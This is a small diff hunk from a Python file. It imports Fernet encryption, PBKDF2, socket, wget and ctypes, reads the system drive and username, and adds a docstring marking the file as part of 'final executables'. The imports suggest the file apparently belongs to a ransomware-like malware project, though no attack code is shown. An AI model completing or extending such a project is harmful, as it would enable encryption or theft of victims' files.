@@ -7,6 +7,8 @@ from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.fernet import Fernet
 import os, sys, socket, wget, struct, ctypes, shutil, base64
 
+""" THIS FILE IS PART OF THE FINAL EXECUTABLES """
+
 # ENVIRONMENT VARIABLE
 letter_drive_path = os.environ["SystemDrive"]
 usr = os.environ["USERNAME"]
